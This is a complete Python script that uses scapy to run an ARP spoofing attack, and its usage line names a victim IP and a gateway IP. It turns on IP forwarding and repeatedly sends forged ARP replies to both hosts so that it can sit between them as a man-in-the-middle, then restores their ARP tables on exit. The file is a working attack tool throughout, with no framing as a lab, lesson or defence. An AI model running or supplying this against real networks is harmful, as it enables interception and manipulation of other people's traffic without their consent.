#!/usr/bin/env python3

import scapy.all as scapy
import time
import os
import logging
import sys
import netifaces

INTERVAL = 2
LOG_FILE = "arp_spoof.log"

# Automatically detect interface if possible
def detect_interface():
    for iface in netifaces.interfaces():
        if iface.startswith("w") or iface.startswith("e"):
            return iface
    return "eth0"  # Fallback

INTERFACE = detect_interface()
print(f"[DEBUG] Using network interface: {INTERFACE}")

logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s - %(message)s")

def get_mac(ip):
    print(f"[DEBUG] Resolving MAC address for {ip}...")
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    answered = scapy.srp(broadcast / arp_request, timeout=3, iface=INTERFACE, verbose=False)[0]
    if answered:
        mac = answered[0][1].hwsrc
        print(f"[INFO] MAC for {ip}: {mac}")
        return mac
    else:
        print(f"[ERROR] Failed to get MAC address for {ip}")
        return None

def enable_ip_forwarding():
    print("[DEBUG] Enabling IP forwarding...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[INFO] IP forwarding enabled.")

def disable_ip_forwarding():
    print("[DEBUG] Disabling IP forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[INFO] IP forwarding disabled.")

def spoof(target_ip, target_mac, spoof_ip):
    pkt = scapy.Ether(dst=target_mac) / scapy.ARP(
        op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip
    )
    scapy.sendp(pkt, iface=INTERFACE, verbose=False)
    print(f"[DEBUG] Sent spoofed packet to {target_ip} claiming to be {spoof_ip}")

def restore(target_ip, target_mac, source_ip, source_mac):
    packet = scapy.Ether(dst=target_mac) / scapy.ARP(
        op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac
    )
    scapy.sendp(packet, count=4, iface=INTERFACE, verbose=False)
    print(f"[INFO] Restored ARP for {target_ip}")

def main(victim_ip, gateway_ip):
    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)

    if not victim_mac or not gateway_mac:
        sys.exit("[FATAL] Could not resolve MAC addresses. Exiting.")

    print("[INFO] Starting ARP spoofing. Press Ctrl+C to stop.")
    enable_ip_forwarding()
    count = 0

    try:
        while True:
            spoof(victim_ip, victim_mac, gateway_ip)
            spoof(gateway_ip, gateway_mac, victim_ip)
            count += 2
            print(f"\r[+] Sent {count} spoofed packets", end="", flush=True)
            time.sleep(INTERVAL)
    except KeyboardInterrupt:
        print("\n[INFO] Detected Ctrl+C. Restoring network...")
        restore(victim_ip, victim_mac, gateway_ip, gateway_mac)
        restore(gateway_ip, gateway_mac, victim_ip, victim_mac)
        disable_ip_forwarding()
        print("[INFO] Clean exit.")

if __name__ == "__main__":
    if os.geteuid() != 0:
        sys.exit("[ERROR] Please run as root (sudo).")

    if len(sys.argv) != 3:
        sys.exit("Usage: sudo python3 arp_spoofer.py <victim_ip> <gateway_ip>")

    victim_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    main(victim_ip, gateway_ip)
